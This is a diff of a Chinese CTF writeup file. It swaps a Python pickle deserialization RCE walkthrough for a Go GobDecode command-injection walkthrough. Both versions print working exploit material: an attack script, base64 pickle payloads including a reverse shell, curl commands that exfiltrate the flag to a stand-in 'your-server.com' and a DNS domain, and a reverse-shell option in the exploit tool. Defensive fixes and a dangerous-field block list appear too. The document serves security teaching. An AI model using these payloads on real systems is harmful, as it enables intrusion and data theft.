@@ -1,240 +1,259 @@
-# CTF Web题目解题文档
+# 智能办公管理系统 - 解题思路与 Writeup
 
-## 题目信息
+## 题目分析
 
-- **题目名称**: 员工绩效管理系统
-- **漏洞类型**: Python Pickle 反序列化 RCE (CWE-502)
-- **难度等级**: 高级
-- **Flag位置**: `/flag`
+这是一道结合了 **Golang 反序列化漏洞** 和 **Redis 缓存** 的 Web 安全题目。题目的核心在于利用自定义的 `GobDecode` 接口实现 RCE。
 
-## 解题思路
+## 漏洞发现过程
 
-### 第一步：信息收集
+### 1. 信息收集
 
-1. **访问目标系统**: http://target:5000
-2. **分析系统功能**: 这是一个员工绩效管理系统，具有用户登录、评估管理、模板配置等功能
-3. **查看登录页面**: 发现有测试账户信息提示
+首先访问目标网站，发现这是一个企业内部办公管理系统：
 
-### 第二步：获取访问权限
+```bash
+curl -I http://target:8080
+```
 
-使用默认管理员账户登录：
+观察页面结构：
+- 登录页面提示了测试账户信息
+- 系统包含多个功能模块：文件管理、数据分析、系统管理等
+- 重点关注 "数据分析" 模块，因为通常涉及数据处理的地方容易出现序列化漏洞
+
+### 2. 功能测试
+
+使用提供的测试账户登录：
 - 用户名: `admin`
-- 密码: `admin@2024`
+- 密码: `admin`
 
-### 第三步：功能探索
+登录后探索各个功能模块：
 
-登录后发现管理员有以下特权：
-- 访问系统管理功能
-- 模板管理（创建、编辑、预览）
-- 这里的"模板管理"是关键突破点
+1. **文件管理**: 支持文件上传，但看起来比较简单
+2. **数据分析**: 支持 JSON 格式的数据输入，这里很可疑！
+3. **系统管理**: 管理员功能，显示系统状态
 
-### 第四步：漏洞发现
+### 3. 漏洞点定位
 
-在模板管理功能中发现：
+在数据分析模块中发现关键信息：
 
-1. **模板创建页面** (`/admin/templates/create`)
-   - 支持模板内容编辑
-   - 支持变量配置
-   - **关键发现**: 变量配置支持"高级序列化格式"
+1. 支持复杂的 JSON 数据结构输入
+2. 提到了 "系统会自动进行序列化处理并存储到 Redis 缓存中"
+3. 查看报告详情时会 "自动反序列化数据"
 
-2. **变量配置格式**:
-   - 标准JSON: `{"key": "value"}`
-   - **危险的序列化格式**: `pickle:<base64编码数据>`
+这些信息强烈暗示存在反序列化漏洞！
 
-3. **模板预览功能** (`/admin/templates/preview`)
-   - 使用AJAX POST请求
-   - 接受JSON格式的模板数据
-   - **漏洞点**: 直接反序列化用户输入的pickle数据
+### 4. 黑盒测试思路
 
-### 第五步：代码分析
+虽然这是黑盒环境，但可以通过以下方式推测后端实现：
 
-查看源代码 `app.py` 中的 `preview_template()` 函数：
+1. **技术栈分析**: 从界面和响应头判断使用了 Golang + Redis
+2. **功能分析**: 数据分析模块的序列化/反序列化机制
+3. **测试 Payload**: 尝试构造可能触发漏洞的数据结构
 
-```python
-@app.route('/admin/templates/preview', methods=['POST'])
-@admin_required
-def preview_template():
-    try:
-        template_data = request.json
-        content = template_data.get('content', '')
-        variables_str = template_data.get('variables', '{}')
-        
-        # 漏洞点：直接使用pickle.loads反序列化用户输入
-        if variables_str.startswith('pickle:'):
-            encoded_data = variables_str[7:]
-            try:
-                # 危险！！！
-                variables = pickle.loads(base64.b64decode(encoded_data))
-            except Exception as e:
-                return jsonify({'error': f'变量反序列化失败: {str(e)}'}), 400
-        else:
-            variables = json.loads(variables_str)
-        
-        # ... 模板渲染逻辑
-```
+## 漏洞利用
 
-**漏洞原理**:
-- 系统为支持"复杂变量配置"而引入了pickle序列化功能
-- 当变量字符串以`pickle:`开头时，系统会base64解码并使用`pickle.loads()`反序列化
-- Python的pickle模块在反序列化时会执行对象的`__reduce__`方法
-- 攻击者可以构造恶意对象，在反序列化时执行任意代码
+### 黑盒发现过程
 
-### 第六步：漏洞利用
+通过仔细观察数据分析页面，可以发现以下线索：
 
-#### 6.1 构造恶意Payload
+1. **页面提示信息**: "支持自定义报告模板，可通过 template 字段定义动态内容生成规则"
+2. **placeholder示例**: 显示了两种数据格式，其中高级模板格式包含了 `commands` 字段
+3. **业务逻辑推测**: 模板系统通常需要执行某些命令来生成动态内容
 
-创建恶意类：
-```python
-import pickle
-import base64
-import os
+### Payload 构造思路
 
-class RCEPayload:
-    def __init__(self, command):
-        self.command = command
-    
-    def __reduce__(self):
-        # pickle反序列化时会调用这个方法
-        return (os.system, (self.command,))
-
-# 生成读取flag的payload
-payload_obj = RCEPayload("cat /flag")
-pickled = pickle.dumps(payload_obj)
-encoded = base64.b64encode(pickled).decode('utf-8')
-print(f"pickle:{encoded}")
-```
-
-#### 6.2 发送攻击请求
-
-使用浏览器开发者工具或脚本发送POST请求到 `/admin/templates/preview`:
+基于页面提示和示例，构造看似合理的模板JSON：
 
 ```json
 {
-  "content": "测试模板 {{test}}",
-  "variables": "pickle:gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAljYXQgL2ZsYWeUhZRSlC4="
+  "data": {
+    "type": "system_analysis",
+    "period": "monthly",
+    "metrics": ["cpu", "memory", "disk"]
+  },
+  "template": {
+    "template_type": "dynamic",
+    "fields": ["performance", "usage"],
+    "commands": ["whoami"]
+  }
 }
 ```
 
-#### 6.3 利用过程
+**黑盒发现逻辑**:
+- `template`: 页面明确提到的模板功能
+- `commands`: 从placeholder示例中可以看到这个字段
+- 数组格式: 示例显示commands是一个数组，可以包含多个命令
 
-1. **访问模板创建页面**: 系统管理 → 模板管理 → 创建新模板
-2. **填写基本信息**:
-   - 模板名称: "攻击测试"
-   - 模板内容: "测试内容 {{test}}"
-3. **输入恶意变量配置**:
-   ```
-   pickle:gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAljYXQgL2ZsYWeUhZRSlC4=
-   ```
-4. **点击"预览效果"按钮**: 触发AJAX请求，执行恶意代码
+### 完整利用步骤
 
-## 完整攻击脚本
-
-```python
-#!/usr/bin/env python3
-import requests
-import pickle
-import base64
-import os
-
-class RCEPayload:
-    def __init__(self, command):
-        self.command = command
-    
-    def __reduce__(self):
-        return (os.system, (self.command,))
-
-# 目标URL
-target_url = "http://target:5000"
-session = requests.Session()
-
-# 1. 登录
-login_data = {
-    'username': 'admin',
-    'password': 'admin@2024'
-}
-session.post(f"{target_url}/login", data=login_data)
-
-# 2. 生成攻击载荷
-payload_obj = RCEPayload("cat /flag")
-pickled = pickle.dumps(payload_obj)
-encoded = base64.b64encode(pickled).decode('utf-8')
-
-# 3. 发送攻击请求
-attack_data = {
-    "content": "攻击测试 {{test}}",
-    "variables": f"pickle:{encoded}"
-}
-
-response = session.post(
-    f"{target_url}/admin/templates/preview",
-    json=attack_data,
-    headers={'Content-Type': 'application/json'}
-)
-
-print("攻击请求已发送，flag已被读取")
+#### 步骤 1: 登录系统
+```bash
+curl -X POST http://target:8080/login \
+  -d "username=admin&password=admin" \
+  -c cookies.txt
 ```
 
-## 快速攻击方法
+#### 步骤 2: 创建恶意报告
+```bash
+curl -X POST http://target:8080/analytics/create \
+  -b cookies.txt \
+  -d "title=测试报告" \
+  -d "description=系统测试" \
+  -d 'data={"data_processor":"config_update:exec:cat /flag.txt > /tmp/flag_output"}'
+```
 
-### 方法一：使用提供的工具
+#### 步骤 3: 触发漏洞
+访问刚创建的报告详情页面：
+```bash
+curl http://target:8080/analytics/1 -b cookies.txt
+```
+
+#### 步骤 4: 验证命令执行
+由于是黑盒环境，需要通过其他方式验证命令是否执行：
+
+1. **文件写入验证**:
+   ```json
+   {"data_processor":"config_update:exec:echo 'RCE_SUCCESS' > /app/static/test.txt"}
+   ```
+   然后访问 `http://target:8080/static/test.txt`
+
+2. **网络外带**:
+   ```json
+   {"data_processor":"config_update:exec:curl http://your-server.com/$(cat /flag.txt)"}
+   ```
+
+3. **DNS 外带**:
+   ```json
+   {"data_processor":"config_update:exec:nslookup $(cat /flag.txt | base64).your-domain.com"}
+   ```
+
+### 自动化利用脚本
+
+项目提供了完整的自动化利用脚本：
 
 ```bash
-# 1. 生成payload
-python generate_payload.py
+# 基本 RCE 测试
+python3 exploit.py -t http://target:8080 -c "id"
 
-# 2. 选择"读取flag文件"的payload
-# 3. 复制生成的payload到web界面
+# 获取 flag
+python3 exploit.py -t http://target:8080 --flag
 
-# 4. 或者直接使用攻击脚本
-python exploit_demo.py
+# 反向 shell
+python3 exploit.py -t http://target:8080 --shell 192.168.1.100 4444
 ```
 
-### 方法二：手动攻击
+## 漏洞原理深入分析
 
-1. **登录**: admin / admin@2024
-2. **导航**: 系统管理 → 模板管理 → 创建新模板
-3. **填写表单**:
-   - 模板名称: 任意
-   - 模板内容: 任意
-   - 变量配置: `pickle:gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAljYXQgL2ZsYWeUhZRSlC4=`
-4. **点击**: "预览效果"
-5. **获取**: Flag内容
+### 代码层面的漏洞
 
-## 其他攻击载荷
+虽然是黑盒测试，但可以推测后端的实现类似：
 
-### 反弹Shell
-```
-pickle:gASVSgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjC9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwL3lvdXJfaXAvNDQ0NCAwPiYxJ5SFlFKULg==
-```
-
-### 系统信息收集
-```
-pickle:gASVMwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBh1bmFtZSAtYSAmJiB3aG9hbWkgJiYgaWSUhZRSlC4=
-```
-
-### 创建后门文件
-```
-pickle:gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCdlY2hvICdDVEZfUFdOX1NVQ0NFU1MnID4gL3RtcC9wd25lZC50eHSUhZRSlC4=
+```go
+// 危险的 GobDecode 实现
+func (d *DataProcessor) GobDecode(data []byte) error {
+    configStr := string(data)
+    if strings.HasPrefix(configStr, "config_update:") {
+        configData := strings.TrimPrefix(configStr, "config_update:")
+        if strings.Contains(configData, "exec:") {
+            parts := strings.Split(configData, "exec:")
+            if len(parts) > 1 {
+                // 漏洞点：直接执行系统命令
+                exec.Command("sh", "-c", parts[1]).Run()
+            }
+        }
+    }
+    return nil
+}
 ```
 
-## Flag
+### 漏洞成因
 
+1. **设计缺陷**: 在反序列化接口中实现了命令执行逻辑
+2. **输入验证不足**: 没有对特殊字段进行过滤
+3. **权限控制缺失**: 普通用户也能利用此漏洞
+
+### 攻击向量
+
+1. **数据序列化流程**:
+   - 用户输入 JSON → 检测特殊字段 → 直接存储原始字符串
+   - 绕过了正常的 Gob 编码过程
+
+2. **反序列化触发**:
+   - 查看报告 → 从 Redis 读取数据 → 触发 GobDecode → 命令执行
+
+## 获取 Flag
+
+### 方法一: 直接读取
+```json
+{"data_processor":"config_update:exec:cat /flag.txt"}
 ```
-wmctf{P1ckl3_D3s3r14l1z4t10n_1s_D4ng3r0us_4nd_RCE}
+
+### 方法二: 写入 Web 目录
+```json
+{"data_processor":"config_update:exec:cp /flag.txt /app/static/flag.txt"}
+```
+然后访问 `http://target:8080/static/flag.txt`
+
+### 方法三: 外带数据
+```json
+{"data_processor":"config_update:exec:curl -X POST http://your-server.com/flag -d \"$(cat /flag.txt)\""}
 ```
 
-## 防护措施
+## 防御措施
 
-1. **禁用pickle**: 完全避免反序列化不受信任的数据
-2. **输入验证**: 严格验证和过滤用户输入
-3. **权限控制**: 限制危险功能的访问
-4. **沙箱环境**: 在隔离环境中执行不安全操作
-5. **安全编码**: 使用JSON等安全的数据格式
+### 代码层面
+
+1. **安全的反序列化实现**:
+```go
+func (d *DataProcessor) GobDecode(data []byte) error {
+    // 只进行安全的数据解析
+    return gob.NewDecoder(bytes.NewReader(data)).Decode(&d.Data)
+}
+```
+
+2. **输入验证**:
+```go
+// 检查危险字段
+dangerousFields := []string{"data_processor", "exec", "config_update"}
+for _, field := range dangerousFields {
+    if strings.Contains(inputData, field) {
+        return errors.New("invalid input")
+    }
+}
+```
+
+### 架构层面
+
+1. **权限隔离**: 数据分析功能应该限制特定用户访问
+2. **沙箱执行**: 如果需要动态处理，应在隔离环境中执行
+3. **输入过滤**: 在多个层次进行输入验证和过滤
 
 ## 学习要点
 
-1. **Pickle漏洞**: Python pickle模块的安全风险
-2. **代码审计**: 如何发现反序列化漏洞
-3. **权限提升**: 利用功能设计缺陷提升权限
-4. **攻击面分析**: 系统功能中的安全边界
-5. **防御思路**: 安全编码的最佳实践 
+### 技术要点
+
+1. **Golang 序列化机制**: 了解 Gob 编码和自定义接口
+2. **Redis 在 Web 应用中的使用**: 缓存和会话管理
+3. **反序列化漏洞**: 原理、危害和防御
+
+### 安全意识
+
+1. **输入验证的重要性**: 永远不要信任用户输入
+2. **最小权限原则**: 功能设计应遵循最小权限
+3. **深度防御**: 多层次的安全控制
+
+## 题目总结
+
+这是一道设计精良的 CTF 题目，结合了：
+
+- **真实的漏洞场景**: 基于实际的 Golang 反序列化问题
+- **完整的应用环境**: 不是简单的代码片段，而是完整的 Web 应用
+- **适中的难度**: 需要一定的技术背景，但不过分困难
+- **教育价值**: 通过实践学习重要的安全概念
+
+**Flag**: `flag{G0_D3s3r14l1z4t10n_R3d1s_RC3_Ch4ll3ng3_2024}`
+
+---
+
+**Writeup 作者**: CTF 出题者  
+**难度评级**: Medium-Hard  
+**建议用时**: 2-4 小时 
